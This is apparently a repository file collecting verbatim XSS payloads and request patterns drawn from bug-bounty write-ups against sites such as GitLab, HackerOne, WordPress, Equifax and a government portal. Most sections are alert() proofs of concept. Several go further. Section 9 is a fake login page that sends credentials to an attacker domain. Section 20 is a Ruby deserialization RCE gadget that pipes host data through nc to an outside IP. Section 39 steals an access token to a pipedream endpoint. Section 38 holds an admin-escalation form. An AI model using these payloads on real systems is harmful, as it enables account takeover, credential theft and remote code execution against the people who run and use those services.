# Payloads — xss

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. XSS-challenge solution thread (10 parts)
- Researcher: @fransrosen
- Post: https://x.com/fransrosen/status/1828503460183941420
- Sources: `posts/fransrosen/2024-08-27-1828503460183941420.md`, `writeups/fransrosen/hackernotes-ep86-xcorrelation.md`

```
Send two query params: ?|targetUrl=<validated> and &targetUrl=javascript:... — one extraction validates, the other reaches location.href (regex [?|&] treats | literally)
```

## 2. Author  stored XSS in wp-admin
- Source: `telegram writeups (verbatim excerpts)`

```
B=http://localhost:8357

# [0] the Author's own wp_rest nonce, read out of the Author's own dashboard.
#     (Application passwords are refused over plain HTTP on this lab, so the runs use the
#      ordinary login cookie + nonce -- exactly what the block editor sends.)
N=$(curl -s -b author.jar "$B/wp-admin/index.php" \
    | grep -oE 'createNonceMiddleware\( *"[a-f0-9]+"' | head -1 | grep -oE '[a-f0-9]{10}')

# [1] Author uploads a real JPEG (cookie + X-WP-Nonce, exactly what the editor uses)
curl -b author.jar -H "X-WP-Nonce: $N" \
     -H "Content-Disposition: attachment; filename=txss.jpg" -H "Content-Type: image/jpeg" \
     --data-binary @zap.jpg -X POST "$B/?rest_route=/wp/v2/media"            # 201, id=8

# [2] Author poisons the thumbnail sub-size filename
#     payload:  a.jpg' /><svg onload='document.title="XSS-EXECUTED-"+document.domain'></svg><b x='
curl -b author.jar -H "X-WP-Nonce: $N" -X POST -H "Content-Type: application/json" \
     --data-binary @xss.json "$B/?rest_route=/wp/v2/media/8/finalize"        # 200

# [3] Administrator (separate session) opens the legacy media popup
curl -b admin.jar "$B/wp-admin/media-upload.php?tab=library"                 # 200
```

## 3. Author  stored XSS in wp-admin
- Source: `telegram writeups (verbatim excerpts)`

```
upload HTTP 201
XID=11
payload: a.jpg' /><svg onload='document.title="XSS-EXECUTED-"+document.domain'></svg><b x='
finalize HTTP 200
stored=a.jpg' /><svg onload='document.title="XSS-EXECUTED-"+document.domain'></svg><b x='
src=http://localhost:8356/wp-content/uploads/2026/07/a.jpg' /><svg onload='document.title="XSS-EXECUTED-"+document.domain'></svg><b x='
```

## 4. Author  stored XSS in wp-admin
- Source: `telegram writeups (verbatim excerpts)`

```
<p><a href='<?php echo esc_url( $attachment_url ); ?>' target='_blank'><img class='thumbnail' src='<?php echo esc_url( $thumb_url ); ?>' alt='' /></a></p>
```

## 5. Stored XSS via Kroki diagram
- Source: `telegram writeups (verbatim excerpts)`

```
return axios
      .get(this.diffForPath)
      .then(({ data }) => {
        this.loadingContent.hide();
        if (data.html) {
          this.content = $(data.html);
```

## 6. Stored XSS in merge request pages
- Source: `telegram writeups (verbatim excerpts)`

```
touch 1.txt
    git add 1.txt
    git commit -m "initial commit"
    git push origin master
    
    git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
    touch 2.txt
    git add 2.txt
    git commit -m "add 2.txt"
    git push origin "<img/src='x'/onerror=alert(document.domain)>"
    
    git checkout master
    touch 3.txt
    git add 3.txt
    git commit -m "add 3.txt"
    git push origin master
```

## 7. Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget
- Source: `telegram writeups (verbatim excerpts)`

```
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>Flipbook Widget</title></head>
<body style="margin:0; padding:0; background:transparent; overflow:hidden;"><div id="widget" style="float:left;"> <script id='vspoverlayrun'

codecredit='CopyRight_VSPWorldwide_Productions'
videofolder='hosted'
projectname='vmags43_overlay'
alignvideo='bottommiddle'
offsetx='0'
offsety='0'
waittime='1000'
autoplay='yes'
videowidth='300'
videoheight='480'
videoscale='1'
videoscalemobile='1'
posterscale='0.5'
clickvideo='close'
autodim='0'
autodimcolor='#000000'

src='https://s3.amazonaws.com/vspcode/vspoverlayrun1.js'></script></div></body></html>
```

## 8. Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget
- Source: `telegram writeups (verbatim excerpts)`

```
$ aws s3api create-bucket --profile frans --bucket vspcode
{
    "Location": "/vspcode"
}

$ echo "alert(document.domain + ':' + location.href);" > vspoverlayrun1.js

$ aws s3 cp vspoverlayrun1.js s3://vspcode/ --acl public-read --profile frans

upload: ./vspoverlayrun1.js to s3://vspcode/vspoverlayrun1.js
```

## 9. Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget
- Source: `telegram writeups (verbatim excerpts)`

```
history.pushState('','Sign in', 'https://www.hackerone.com/users/sign_in')
function log() { 
 var x = new FormData(document.forms[0]);
 (new Image()).src='https://MY-DOMAIN/hackerone/?' + btoa(JSON.stringify(Object.fromEntries(x.entries())))
};
document.body.parentElement.innerHTML = 'login-page-of-hackerone.com';
```

## 10. Stored XSS in SVG file as data
- Source: `telegram writeups (verbatim excerpts)`

```
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://us-based-organization-h1.myshopify.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve" height="100px" width="100px">
<g>
	<path d="M28.1,36.6c4.6,1.9,12.2,1.6,20.9,1.1c8.9-0.4,19-0.9,28.9,0.9c6.3,1.2,11.9,3.1,16.8,6c-1.5-12.2-7.9-23.7-18.6-31.3   c-4.9-0.2-9.9,0.3-14.8,1.4C47.8,17.9,36.2,25.6,28.1,36.6z"/>
	<path d="M70.3,9.8C57.5,3.4,42.8,3.6,30.5,9.5c-3,6-8.4,19.6-5.3,24.9c8.6-11.7,20.9-19.8,35.2-23.1C63.7,10.5,67,10,70.3,9.8z"/>
	<path d="M16.5,51.3c0.6-1.7,1.2-3.4,2-5.1c-3.8-3.4-7.5-7-11-10.8c-2.1,6.1-2.8,12.5-2.3,18.7C9.6,51.1,13.4,50.2,16.5,51.3z"/>
	<path d="M9,31.6c3.5,3.9,7.2,7.6,11.1,11.1c0.8-1.6,1.7-3.1,2.6-4.6c0.1-0.2,0.3-0.4,0.4-0.6c-2.9-3.3-3.1-9.2-0.6-17.6   c0.8-2.7,1.8-5.3,2.7-7.4c-5.2,3.4-9.8,8-13.3,13.7C10.8,27.9,9.8,29.7,9,31.6z"/>
	<path d="M15.4,54.7c-2.6-1-6.1,0.7-9.7,3.4c1.2,6.6,3.9,13,8,18.5C13,69.3,13.5,61.8,15.4,54.7z"/>
	<path d="M39.8,57.6C54.3,66.7,70,73,86.5,76.4c0.6-0.8,1.1-1.6,1.7-2.5c4.8-7.7,7-16.3,6.8-24.8c-13.8-9.3-31.3-8.4-45.8-7.7   c-9.5,0.5-17.8,0.9-23.2-1.7c-0.1,0.1-0.2,0.3-0.3,0.4c-1,1.7-2,3.4-2.9,5.1C28.2,49.7,33.8,53.9,39.8,57.6z"/>
	<path d="M26.2,88.2c3.3,2,6.7,3.6,10.2,4.7c-3.5-6.2-6.3-12.6-8.8-18.5c-3.1-7.2-5.8-13.5-9-17.2c-1.9,8-2,16.4-0.3,24.7   C20.6,84.2,23.2,86.3,26.2,88.2z"/>
	<path d="M30.9,73c2.9,6.8,6.1,14.4,10.5,21.2c15.6,3,32-2.3,42.6-14.6C67.7,76,52.2,69.6,37.9,60.7C32,57,26.5,53,21.3,48.6   c-0.6,1.5-1.2,3-1.7,4.6C24.1,57.1,27.3,64.5,30.9,73z"/>
</g>
</svg>
```

## 11. [user_oidc] Stored XSS via Authorization Endpoint - Safari-Only
- Source: `telegram writeups (verbatim excerpts)`

```
// Workaround to avoid empty session on special conditions in Safari
		// https://github.com/nextcloud/user_oidc/pull/358
		if ($this->request->isUserAgent(['/Safari/']) && !$this->request->isUserAgent(['/Chrome/'])) {
			return new Http\DataDisplayResponse('<meta http-equiv="refresh" content="0; url=' . $url . '" />');
		}
```

## 12. [user_oidc] Stored XSS via Authorization Endpoint - Safari-Only
- Source: `telegram writeups (verbatim excerpts)`

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
[...]

{
  "issuer":"http:\/\/idp.local:3000",
  "authorization_endpoint":"'\" http-equiv=><svg\/onload=alert(document.domain)>",
[...]
}
```

## 13. [user_oidc] Stored XSS via Authorization Endpoint - Safari-Only
- Source: `telegram writeups (verbatim excerpts)`

```
HTTP/1.1 200 OK
Date: Wed, 31 Aug 2022 12:47:57 GMT
Server: Apache/2.4.54 (Debian)
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Robots-Tag: none
X-XSS-Protection: 1; mode=block
X-Powered-By: PHP/8.0.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
X-Request-Id: yUWr3aQshJ5OHyMuzG1j
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
Content-Disposition: inline; filename=""
Vary: Accept-Encoding
Content-Length: 492
Connection: close
Content-Type: text/html; charset=UTF-8

<meta http-equiv="refresh" content="0; url='" http-equiv=><svg/onload=alert(document.domain)>?client_id=test.local&response_type=code&scope=openid+email+profile&redirect_uri=http%3A%2F%2Flocalhost%3A8081%2Fapps%2Fuser_oidc%2Fcode&claims=%7B%22id_token%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%2C%22userinfo%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%7D&state=FB8IZL2JE55LJ1Y5HJAINPY6OTDQ16P1&nonce=356M5O3J1PKMRKJNBKE40RUGJA06O40E" />
```

## 14. Stored-XSS with CSP-bypass via labels' color
- Source: `telegram writeups (verbatim excerpts)`

```
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

## 15. Stored-XSS with CSP-bypass via labels' color
- Source: `telegram writeups (verbatim excerpts)`

```
curl -kv "https://gitlab.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "523303538",
    "target_namespace": "yvvdwf",
    "new_name": "xss-on-label-color",
    "github_hostname": "http://51.75.74.52:80"
}'
```

## 16. Incomplete fix for CVE-2022-32209 (XSS in Rails
- Source: `telegram writeups (verbatim excerpts)`

```
From fb9882599684f5796805107ec98f6a18bba722ec Mon Sep 17 00:00:00 2001
From: Dominic Breuker <dominic.breuker@protonmail.com>
Date: Fri, 29 Jul 2022 23:08:57 +0200
Subject: [PATCH] disallow select and style in safelist also when specified in
 sanitizer class allowed_tags list

---
 lib/rails/html/sanitizer.rb |  6 +-----
 test/sanitizer_test.rb      | 20 ++++++++++++++++++++
 2 files changed, 21 insertions(+), 5 deletions(-)

diff --git a/lib/rails/html/sanitizer.rb b/lib/rails/html/sanitizer.rb
index 97503c8..4a0d43f 100644
--- a/lib/rails/html/sanitizer.rb
+++ b/lib/rails/html/sanitizer.rb
@@ -155,11 +155,7 @@ module Rails
       end
 
       def allowed_tags(options)
-        if options[:tags]
-          remove_safelist_tag_combinations(options[:tags])
-        else
-          self.class.allowed_tags
-        end
+        remove_safelist_tag_combinations(options[:tags] || self.class.allowed_tags)
       end
 
       def allowed_attributes(options)
diff --git a/test/sanitizer_test.rb b/test/sanitizer_test.rb
index e3ce218..3f0a88a 100644
--- a/test/sanitizer_test.rb
+++ b/test/sanitizer_test.rb
@@ -606,6 +606,26 @@ class SanitizersTest < Minitest::Test
     refute_includes(sanitized, "style")
   end
 
+  def test_disallow_the_dangerous_safelist_combination_of_select_and_style_in_class_tag_list
+    scope_allowed_tags(["select", "style"]) do
+      input = "<select><style><script>alert(1)</script></style></select>"
+      warning = /WARNING: Rails::Html::SafeListSanitizer: removing 'style' from safelist/
+      sanitized = nil
+      invocation = Proc.new { sanitized = safe_list_sanitize(input) }
+
+      if html5_mode?
+        # if Loofah is using an HTML5 parser,
+        #   then "style" should be removed by the parser as an invalid child of "select"
+        assert_silent(&invocation)
+      else
+        # if Loofah is using an HTML4 parser,
+        #   then SafeListSanitizer should remove "style" from the safelist
+        assert_output(nil, warning, &invocation)
+      end
+      refute_includes(sanitized, "style")
+    end
+  end
+
 protected
 
   def xpath_sanitize(input, options = {})
-- 
2.35.1
```

## 17. CSP-bypass XSS in project settings page
- Source: `telegram writeups (verbatim excerpts)`

```
deployKeyRowHtml(key, isActive) {
    const isActiveClass = isActive || '';

    return `
      <li>
        <a href="#" class="${isActiveClass}">
          <strong>${key.title}</strong>
          <p>
            ${sprintf(
              __('Owned by %{image_tag}'),
              {
                image_tag: `<img src="${key.avatar_url}" class="avatar avatar-inline s26" width="30">`,
              },
              false,
            )}
            <strong class="dropdown-menu-user-full-name gl-display-inline">${escape(
              key.fullname,
            )}</strong>
            <span class="dropdown-menu-user-username gl-display-inline">${key.username}</span>
          </p>
        </a>
      </li>
    `;
  }
```

## 18. XSS in ZenTao integration affecting self hosted instances without strict CSP
- Source: `telegram writeups (verbatim excerpts)`

```
{
   "id": "<img src=# height=10000 width=10000>",
   "url": "javascript:alert(document.domain)"
}
```

## 19. XSS in ZenTao integration affecting self hosted instances without strict CSP
- Source: `telegram writeups (verbatim excerpts)`

```
{
    "issue": {
        "id": "<img src=# height=10000 width=10000>",
        "title": "Attack",
        "labels": [],
        "pri": 3,
        "openedDate": "2021-08-10T08:25:18Z",
        "openedBy": {
            "id": 1,
            "account": "asd",
            "realname": "admin",
            "avatar": "https://www.gravatar.com/avatar/21232f297a57a5a743894a0e4a801fc3?d=identicon&s=80",
            "url": "https://example.com"
        },
        "lastEditedDate": "2021-08-10T08:25:18Z",
        "lastEditedBy": "asd",
        "status": "asd",
        "url": "javascript:alert(document.domain)",
        "desc": "description",
        "assignedTo": [],
        "comments": []
    }
}
```

## 20. RCE via github import
- Source: `telegram writeups (verbatim excerpts)`

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname; ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
```

## 21. XSS on Brave Today through custom RSS feed
- Source: `telegram writeups (verbatim excerpts)`

```
<entry>
  <title>XSS</title>
  <link rel="alternate" type="text/html" href="javascript:alert(document.domain)" />
  <content type="html"><![CDATA[<img src="https://csrf.jp/test.png">]]></content>
</entry>
```

## 22. New XSS vector in ReaderMode with %READER-TITLE-NONCE%
- Source: `telegram writeups (verbatim excerpts)`

```
<meta name="author" content="Evil &lt;script nonce=%READER-TITLE-NONCE%&gt;alert(document.location);&lt;/script&gt;!--">
```

## 23. XSS via Vuln Rendertron Instance At `.jetblue.com/render/*`
- Source: `telegram writeups (verbatim excerpts)`

```
GET /render/https://berkaybasar.github.io/ HTTP/2
Host: ███.jetblue.com
Cookie: _ga=GA1.2.948863714.1675140227; _gid=GA1.2.104763714.1675140227
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://█████████.jetblue.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

## 24. XSS via Vuln Rendertron Instance At `.jetblue.com/render/*`
- Source: `telegram writeups (verbatim excerpts)`

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Renderer: ██████████
Strict-Transport-Security: max-age=15724800; includeSubDomains
Via: 1.1 varnish, 1.1 varnish
Accept-Ranges: bytes
Date: Tue, 31 Jan 2023 05:20:05 GMT
Age: 0
X-Served-By: cache-iad-kjyo7100133-IAD, cache-hhn-etou8220066-HHN
X-Cache: MISS, MISS
X-Cache-Hits: 0, 0
X-Timer: S1675142405.512544,VS0,VE1332
Vary: Accept-Encoding
Content-Length: 182

<html><head><base href="https://berkaybasar.github.io/"></head><body><xss onblur="alert(1)" id="x" tabindex="1" style="display:block">test</xss><input value="clickme">
</body></html>
```

## 25. XSS vulnerability without a content security bypass in a `CUSTOM` App through Button tag
- Source: `telegram writeups (verbatim excerpts)`

```
import { Box, ContextView, Inline, Link } from "@stripe/ui-extension-sdk/ui";
import type { ExtensionContextValue } from "@stripe/ui-extension-sdk/context";
import {Button} from '@stripe/ui-extension-sdk/ui';
import {Img} from '@stripe/ui-extension-sdk/ui'
import {Chip, ChipList} from '@stripe/ui-extension-sdk/ui';

import BrandIcon from "./brand_icon.svg";

/**
 * This is a view that is rendered in the Stripe dashboard's customer detail page.
 * In stripe-app.json, this view is configured with stripe.dashboard.customer.detail viewport.
 * You can add a new view by running "stripe apps add view" from the CLI.
 */

const App = ({ userContext, environment }: ExtensionContextValue) => {
  return (
    <ContextView
      title="XSS POC"
      brandColor="#F6F8FA" // replace this with your brand color
      brandIcon={BrandIcon} // replace this with your brand icon
    >
	  
	  <Button href="javascript://%0aalert(123)">
		XSS with %0a
	  </Button>
	  <Button href="javascript://%0dalert(document.domain)">
		XSS with %0d
	  </Button>
	  
    </ContextView>
  );
};

export default App;
```

## 26. reflected XSS in [www.equifax.com]
- Source: `telegram writeups (verbatim excerpts)`

```
<script type="text/javascript">
           window.onload = function(e){
            	Analytics.trackEvent('emptySearch',{internalSearchTerm: "broook" , numOfSearchResultsReturned: 0});
            	}
           </script>
```

## 27. reflected XSS in [www.equifax.com]
- Source: `telegram writeups (verbatim excerpts)`

```
<script type="text/javascript">
	      window.onload = function(e){
	          Analytics.trackEvent('SEARCHRETURNED',{internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 167});            	
	               	}
	     </script>
```

## 28. reflected XSS in [www.equifax.com]
- Source: `telegram writeups (verbatim excerpts)`

```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "broook" , numOfSearchResultsReturned: 1});
	
}
</script>
```

## 29. reflected XSS in [www.equifax.com]
- Source: `telegram writeups (verbatim excerpts)`

```
<script type="text/javascript">

var pageProduct = null;
window.onload = function(e){ 
		
		Analytics.trackEvent('SEARCHRETURNED', {internalSearchTerm: "" , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsReturned: "b" , numOfSearchResultsReturned: 1});
	
}
</script>
```

## 30. Cache Deception Allows Account Takeover
- Source: `telegram writeups (verbatim excerpts)`

```
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```

## 31. [XSS] Reflected XSS via POST request
- Source: `telegram writeups (verbatim excerpts)`

```
POST /██████/███████-historic.cfm HTTP/1.1
Host: █████████
Cookie: CFID=29878711; CFTOKEN=71972184
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 347
Origin: null
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

fld_graphfs=Y&fld_graphrs=N&fld_graphy1=N&fld_graphy2=N&fld_normal=Y&fld_max=Y&fld_min=Y&Submit=View-Graph&fld_from1=01%2F01%2F2023&fld_to1=12%2F31%2F2023&fld_displaytype=S"%20accesskey%3d"X"%20onclick%3d"alert('XSS Success!')&fld_type1=Plot&fld_frompor=&fld_topor=&fld_year1=2023&fld_year2=2023&fld_mon1=01&fld_day1=01&fld_mon2=12&fld_day2=31&fld_param=HT
```

## 32. Reflected XSS at
- Source: `telegram writeups (verbatim excerpts)`

```
https://████/dochelper?userId=</b><script>alert(document.cookie)</script><b><!--
```

## 33. HTML injection that may lead to XSS on HackerOne.com through H1 Triage Wizard Chrome Extension
- Source: `telegram writeups (verbatim excerpts)`

```
buildTriageQuestionnaireModal = (
  modalElement,
  triageQuestionnaireModalOptions
) => {
  let questionnaireResponses =
    triageQuestionnaireModalOptions.questionnaireResponses;
  if (questionnaireResponses) {
    modalElement.innerHTML = triageQuestionnaireHTML
      .replace("{{handle}}", triageQuestionnaireModalOptions.handle) // <-- the handle here is taken from the subject parameter (i.e. "security")
      .replace("{{1}}", questionnaireResponses[1]) // <-- the response to the questionnaire is interpolated without sanitizing it
      .replace("{{2}}", questionnaireResponses[2]) // <-- this applies to all of these
      .replace("{{3}}", questionnaireResponses[3])
// ...
```

## 34. Rails ActionView sanitize helper bypass leading to XSS using SVG tag.
- Source: `telegram writeups (verbatim excerpts)`

```
<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```

## 35. reflected xss in www..gov
- Source: `telegram writeups (verbatim excerpts)`

```
POST /ioss/site/customer.cfm?oHvIaPEiVgj7Hf9Ux5T+eNZwuEg2J/n12v1EZMCIm2I= HTTP/1.1
Host: www.████.gov
Cookie: CFID=37933027; CFTOKEN=51767030; JSESSIONID=1A3418B42833E571ACD8B2EA991592C4.cfusion; __utma=90160643.185474856.1671578010.1671578010.1671578010.1; __utmc=90160643; __utmz=90160643.1671578010.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_GSA_CP=1; __utmb=90160643.10.10.1671578010
Content-Length: 628
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://www.██████████.gov
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.█████████.gov/ioss/site/customer.cfm?M8LgLru4s3ED7nBcLICmmmePvRA/+vXyGWDMaEFgwajcrt1aH3tfpVSr8pUuzMfeeJrg2zmmBIsdNqSXGXhXtg==
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

prefixRank=ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15&firstName=asdasd&middleName=ads&lastName=dez&affiliationID=1&level1=2&level3=&ORGNAME=Department+of+Agriculture&company=dez&address1=deaxsxas&address2=asda&city=asdas&state=OT&zip=3423423423&country=Anguilla&email=dezprogrammer%40gmail.com&dayPhone1=910&dayPhone2=648&dayPhone3=7750&dayPhone4=122&fax1=501&fax2=234&fax3=2343&orgID=&customerID=0&shipID=&passwordMetRequirements=False&passwordStrength=Very+Strong&pwChangeReqd=true&pw_minChars=14&pw_minUCase=2&pw_minLCase=2&pw_minNums=2&pw_minSymb=2&password=Salam123456789%40%40%40&passwordTxt=&mask=1&password2=Salam123456789%40%40%40&q1=1&a1=dez&q2=2&a2=dez
```

## 36. xss due to incorrect handling of postmessages
- Source: `telegram writeups (verbatim excerpts)`

```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>New webpage</title>
    </head>
    <body>
        <script>
        function main()
{
	window['test']=window.open("https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania");
	const pwntimer = setTimeout(pwn, 3000);	
}
function pwn(){window['test'].postMessage('{"results":{"timestamp":'+Date.now()+',"code":"","errors":[],"assertions":[],"warnings":[],"tests":[{"name":"","state":"pass","results":[{"type":"assertion","msg":"http://#/\\"style=\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\"onmouseover=\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\"","state":"pass","expected":"","meta":{"structure":"function() {pwned!}"}}]}]}}',"*");clearTimeout(pwntimer)};
        </script>
        <button onclick="main();">press to pwn</button>
    </body>
</html>
```

## 37. XSS
- Source: `telegram writeups (verbatim excerpts)`

```
<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
```

## 38. XSS
- Source: `telegram writeups (verbatim excerpts)`

```
'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
  stage: build
  script: echo "hi"

'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
  stage: build
  script: echo "hi"

trigger-xss:
  stage: test
  script: echo "hi"
  dependencies:
    - '1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>'
```

## 39. XSS in SocialIcon Link
- Source: `telegram writeups (verbatim excerpts)`

```
await fetch("https://linktr.ee/api/token", {
    "credentials": "include",
    "method": "GET"
})
.then((response) => response.json())
.then((responseJson) => {
    fetch("https://en2celr7rewbul.m.pipedream.net/?token="+responseJson["accessToken"]);
})
```

## 40. XSS in SocialIcon Link
- Source: `telegram writeups (verbatim excerpts)`

```
javascript://https://amazon.com/shop/x%0Aeval(\"(async()=>{await+fetch('https://linktr.ee/api/token').then((response)=>response.json()).then((responseJson)=>{alert(responseJson['accessToken']);})})()\")
```

## 41. CVE-2022-23519
- Source: `telegram writeups (verbatim excerpts)`

```
irb(main):016:0> require 'rails-html-sanitizer'
=> false
irb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>", tags: ["svg", "style"]).to_s
=> "<svg><style><script>alert(1)</script></style></svg>"
irb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
=> "<math><style><img src=x onerror=alert(1)></style></math>"
irb(main):019:0> puts Rails::Html::Sanitizer::VERSION
1.4.3
=> nil
```

## 42. CVE-2022-23519
- Source: `telegram writeups (verbatim excerpts)`

```
#!/ibn/sh

# make routes
cat << EOF > ./config/routes.rb
Rails.application.routes.draw do
  get "/poc1", to: "poc1#index"
  get "/poc2", to: "poc2#index"
end
EOF

# make Poc1 endpoint
# http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E
bin/rails generate controller Poc1 index --skip-routes

cat << EOF > ./app/controllers/poc1_controller.rb
class Poc1Controller < ApplicationController
  def index
    @name = params[:name] || "put your name here"
  end
end
EOF


cat << EOF > ./app/views/poc1/index.html.erb
<h1> Hello <%= sanitize @name, tags: ["svg", "style"] %> </h1>
<br>
PoC with a sanitized, reflected parameter 'name' for which 'svg' annd 'style' tags are allowed.
<br>
<%= link_to "Go to PoC", "/poc1?name=<svg><style><script>alert(1)</script></style><svg>" %>
<br>
<br>
Using: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>
EOF


